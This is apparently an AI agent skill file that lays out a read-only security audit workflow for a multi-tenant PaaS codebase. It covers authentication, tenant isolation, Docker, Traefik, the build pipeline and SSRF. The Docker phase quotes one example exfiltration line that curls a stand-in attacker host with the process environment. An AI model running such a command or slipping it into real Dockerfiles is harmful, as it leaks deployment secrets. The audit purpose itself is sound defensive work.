---
name: nexploy-security-audit
description: Complete security audit and penetration-testing workflow for the Nexploy monorepo (Next.js 16 + Better Auth, Hono docker-api, Prisma/PostgreSQL, Docker, Traefik, Inngest). Trigger when the user asks to audit, pentest, or review the security of Nexploy's codebase, infrastructure, APIs, Docker deployment pipeline, or authentication.
whenToUse: When auditing the Nexploy codebase, infrastructure, APIs, Docker deployment, authentication, or SaaS/multi-tenant security.
disableModelInvocation: false
---

# Nexploy Security Audit Skill

You are acting as a senior Application Security Engineer performing a read-only security audit of Nexploy — a self-hosted, multi-tenant PaaS (Vercel/Netlify-like) that deploys user Git repositories into Docker containers behind Traefik.

**Ground rule: never modify files during an audit.** This skill produces findings, not fixes, unless the user explicitly asks you to patch something afterward. Do not run destructive commands, do not touch running containers, do not exfiltrate real secret values found in `.env` files — reference their location and redact the value in the report.

## Real architecture (do not assume — verify against this)

- `apps/nexploy` — Next.js 16, custom `server.ts` (WebSocket proxy), Better Auth, Prisma, `next-safe-action` server actions, Inngest background jobs, next-intl.
- `apps/docker-api` — Hono.js REST API, the *only* service that is supposed to talk to the Docker daemon (`/var/run/docker.sock`). State managers poll Docker and emit SSE.
- `apps/desktop` — Electron shell reusing the same UI components.
- Auth: Better Auth (`/apps/nexploy/src/lib/auth/auth.ts`) — email/password, GitHub/GitLab OAuth, TOTP 2FA, admin plugin, cookie sessions (not raw JWT unless Better Auth issues one internally — verify, don't assume).
- Mutations go through `authActionServer`-wrapped server actions in `src/actions/**/*.action.ts`; all GET/read paths must be Next.js API routes under `src/app/api/**` per this repo's mandatory convention — an action that reads data instead of mutating it is itself a finding.
- Env vars are AES-256-CBC encrypted at rest (`src/lib/encryption.ts`, key = `ENCRYPTION_KEY`) and written to a `.env` file on disk during the Inngest `write-env-file` build step — that file's lifecycle (creation, permissions, cleanup) is a specific thing to check.
- Webhooks: GitHub/GitLab webhook handlers verify signatures — confirm this actually happens per-provider.
- Traefik: dynamic file provider watches `/infra/traefik/service/*`, one config per repository/deployment — user-controlled data (repo name, subdomain, custom domain) flowing into these generated files is a template-injection/config-injection surface.

Do not assume any of the above is implemented correctly — verify each claim against the current code before relying on it in a finding.

---

## Methodology

Work in this order. For each phase, read the real files before making claims — cite `file:line` for every finding.

1. Reconnaissance (structure, versions, deps, env vars)
2. Authentication (Better Auth config, sessions, cookies, OAuth, 2FA)
3. Authorization / multi-tenancy (IDOR, BOLA, ownership checks)
4. Server actions & API routes
5. Middleware
6. Prisma / PostgreSQL
7. Docker & docker-api (the highest-blast-radius surface in this app)
8. Traefik & reverse proxy config generation
9. Inngest build pipeline (git clone, dockerfile, env write, image build, deploy)
10. SSRF / RCE
11. File handling (repo files, Dockerfiles, avatars, imports)
12. Secrets detection
13. Security headers / CORS
14. Dependency & supply-chain audit
15. Business logic (quotas, plan limits, invitations, API keys)

---

## Phase 1 — Reconnaissance

- Read `package.json` at root and per-app; note Next.js/Hono/Prisma/Better Auth versions.
- `pnpm audit` (suggest the command; run it if allowed).
- Enumerate `src/actions/**/*.action.ts`, `src/app/api/**`, `apps/docker-api/src/routes/**`.
- List all env vars referenced via `process.env` and cross-check which are actually set vs. assumed.
- Check `.env*` files are gitignored; check git history for accidentally committed secrets (`git log -p -- .env` style checks, or point to gitleaks/trufflehog).

## Phase 2 — Authentication (Better Auth)

Read `apps/nexploy/src/lib/auth/auth.ts` and any Better Auth plugin config.

- Session cookie flags: `HttpOnly`, `Secure`, `SameSite`. Better Auth defaults are usually sane — confirm nothing overrides them insecurely.
- OAuth token storage/refresh: `getValidToken()` — is the refresh token encrypted at rest? Can a token for one provider leak into requests for another?
- 2FA/TOTP: backup codes generation entropy, rate limiting on verification attempts, whether 2FA can be bypassed by hitting an alternate login/session-creation path.
- Password policy, brute-force protection (login, password reset, register) — is there any rate limiting at all (middleware, Traefik, or app-level)?
- Account enumeration via distinct error messages on login/register/reset.
- Admin plugin: confirm admin-only Better Auth endpoints are actually gated by role, not just hidden in the UI.

## Phase 3 — Authorization & multi-tenant isolation

This is the highest-value phase for a PaaS like Nexploy. For **every** Prisma read/write keyed by an ID coming from the client (repository ID, build ID, container ID, env variable ID, deployment ID), verify the query also filters by `userId`/tenant/org — not just `id`.

Bad pattern to flag:
```ts
prisma.repository.findUnique({ where: { id } })
```
Should be:
```ts
prisma.repository.findFirst({ where: { id, userId: ctx.user.id } })
```

Also check:
- Server actions that accept a resource ID: does `authActionServer` alone prove ownership, or just authentication? (Usually authentication only — ownership needs an explicit check per action.)
- docker-api routes: can a request reference a container/image belonging to another user's deployment, given docker-api itself has no concept of Nexploy's users unless nexploy enforces it before calling docker-api?
- SSE channels (`build:{buildId}`, `containers`, etc.) — can a user subscribe to another tenant's channel?
- WebSocket terminal proxy (`/api/ws/docker/terminal/:containerId/:shell`) — is container ownership checked before the proxy connects, or does knowing a containerId grant a shell into anyone's container?

## Phase 4 — Server actions & API routes

For every `"use server"` action in `src/actions/**`:
- Wrapped in `authActionServer`? Any action reachable without auth?
- Input validated with a Zod schema from `@workspace/schemas-zod`, or raw `parsedInput` trusted?
- Ownership check present for update/delete actions (see Phase 3)?
- Confirm it's actually a mutation — per this repo's mandatory rule, a GET-shaped action here (fetching data) is itself a convention/security smell worth flagging (bypasses whatever caching/permission layering the API-route pattern enforces).

For every route in `src/app/api/**` and `apps/docker-api/src/routes/**`:
- Auth middleware present (`authRouteServer` / equivalent in Hono)?
- `requirePermission()` (or equivalent) checked, and does it check the *specific resource*, not just "is authenticated"?
- Rate limiting on sensitive endpoints (login, register, reset, deployment creation, API key creation)?
- Webhook endpoints (GitHub/GitLab): signature verification present and using constant-time comparison?

## Phase 5 — Middleware

Read `apps/nexploy/src/middleware.ts` (or equivalent) and `server.ts`.
- `matcher` config: does it exclude paths that should be protected (`/admin`, `/api/*`)?
- Locale-prefixed routes (`/[locale]/(app)/...`) — can the locale segment be abused to bypass a route-based auth check that doesn't account for the prefix?
- Custom WebSocket upgrade handling in `server.ts` — does it run through the same auth checks as normal HTTP requests, or is it a parallel path that forgets to authenticate?

## Phase 6 — Prisma / PostgreSQL

- Search for `$queryRaw`/`$executeRaw` and confirm parameterized (tagged template) usage, not string interpolation.
- Confirm migrations don't leave default/weak credentials.
- Confirm `EnvVariable` values are never selected in a query that's returned to a client without decryption gating by ownership.
- Check cascade deletes / soft deletes don't leak orphaned data accessible cross-tenant.

## Phase 7 — Docker & docker-api (critical surface)

Nexploy's entire value prop is running other people's code in containers — treat this as the primary attack surface.

- Confirm only `docker-api` touches `/var/run/docker.sock`, and that docker-api itself isn't reachable directly from the public internet without auth (check its listen address/port and whether Traefik/network config exposes port 3300 externally).
- Container creation: are resource limits (CPU/memory/pids) enforced, or can a deployed container exhaust the host?
- Is `--privileged`, host network mode, or host volume mounts (especially the Docker socket itself) ever passed into user-deployed containers? That's a direct container-escape/host-takeover path.
- Dockerfile handling during build: is the user-supplied Dockerfile from their repo used as-is (expected), or does Nexploy inject anything unsafely (e.g., string-concatenating user env values into a generated Dockerfile/entrypoint)?
- Build step (`build-docker-image`): does the build process run with any credentials (registry push tokens, etc.) that a malicious Dockerfile `RUN` step could exfiltrate (e.g., via `RUN curl attacker.com --data-binary @/proc/self/environ` during build)?
- Image cleanup / disk usage code (recent commits touched `DiskUsageCard` and image cleanup) — check for path traversal or command injection when identifying/removing images by name/tag derived from user input.

## Phase 8 — Traefik

- Dashboard (`api.dashboard=true`) — exposed without auth?
- Per-repository dynamic config files in `/infra/traefik/service/` — are router/host rules built from user-controlled strings (custom domain, subdomain, repo name) without sanitization? Could a crafted repo name break out of the expected router rule and hijack routing for another service?
- TLS/cert-resolver config, and whether HTTP→HTTPS redirect is enforced globally.
- Network alias/health-check logic added in container recreation (recent commits) — confirm a container can't register an alias that collides with/overrides another tenant's service.

## Phase 9 — Inngest build pipeline

Walk `clone-repository → prepare-dockerfile → write-env-file → build-docker-image → deploy-container → cleanup → finalize-logs`:
- Git clone: OAuth token used — scoped correctly, not logged in build output?
- `write-env-file`: decrypted env values written to disk — file permissions, and is it actually deleted in `cleanup` even on failure paths (check `finally`/step error handling, not just the happy path)?
- Resumability: `Build.lastCompletedStep` — can a user manipulate a build ID to resume/replay another user's build and access its logs or artifacts?
- Log streaming channels (`build:{buildId}`) — same isolation question as Phase 3.

## Phase 10 — SSRF / RCE

- Any URL fetched based on user input (webhook URLs, custom domains, avatar/image URLs, git remote URLs) — can it target `127.0.0.1`, internal service ports (docker-api on 3300, Postgres on 5433), or cloud metadata (`169.254.169.254`)?
- `child_process`/`exec`/`spawn` calls — is any argument built from unsanitized user input (repo name, branch, env var names/values)? Prefer array-form `spawn` over shell string concatenation; flag anything using `exec()` with interpolated strings.
- `eval`/`new Function()` anywhere in request-handling paths.

## Phase 11 — File handling

- Avatar/image uploads: extension + MIME + magic-byte validation, storage path not derived unsanitized from filename (path traversal via `../`).
- Cloned repo contents: anything from the repo (Dockerfile path, build context path) that could traverse outside the intended clone directory.

## Phase 12 — Secrets detection

- Grep for hardcoded secrets, API keys, `ENCRYPTION_KEY` fallback/default values in code (a hardcoded fallback key is critical).
- Confirm `.env*` are gitignored and not present in git history.
- Suggest gitleaks/trufflehog for a full history scan.

## Phase 13 — Security headers / CORS

- CSP, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy` — check `next.config` headers and any Hono middleware on docker-api.
- CORS on docker-api and Next.js API routes: `Access-Control-Allow-Origin: *` combined with credentials is critical; confirm allowed origins are an explicit allowlist.

## Phase 14 — Dependency / supply chain

- `pnpm audit`, check for known-malicious or typosquatted packages, check `pnpm-lock.yaml` integrity hashes are present (not `--no-verify-store-integrity` disabled anywhere).
- CI/CD (GitHub Actions under `.github/workflows`): pinned action versions vs. floating tags, secrets exposure in logs, `pull_request_target` misuse.

## Phase 15 — Business logic

- Plan/quota enforcement: deployment count limits, resource limits — enforced server-side, not just UI-gated.
- Invitation flows: can an invitation token be reused, guessed, or escalate role on acceptance?
- API key scoping and revocation — are keys checked for scope/expiry on every request, and is revocation immediate (not cached)?

---

## Report format

For every finding:

```
[SEVERITY] Title

Location: file:line

Description: what's wrong.

Impact: what an attacker achieves.

Exploit scenario: concrete realistic attack path (request/payload where relevant).

Fix: secure code suggestion (do not apply automatically).

Priority: Immediate / Soon / Later
```

### Severity

- **Critical** — RCE, Docker/container escape, DB compromise, account takeover, cross-tenant container access.
- **High** — IDOR/BOLA, privilege escalation, SSRF, secret exposure.
- **Medium** — missing security headers, weak validation, missing rate limiting on non-auth-critical endpoints.
- **Low** — information disclosure, verbose errors, minor hardening gaps.

## Final summary

End every audit with:
- Security score /100
- Counts by severity (Critical/High/Medium/Low)
- Top 3 immediate fixes
- Longer-term roadmap (2-3 items)

Never claim code is secure without having read it. If a phase can't be verified (e.g., no access to live infra), say so explicitly rather than assuming it's fine.
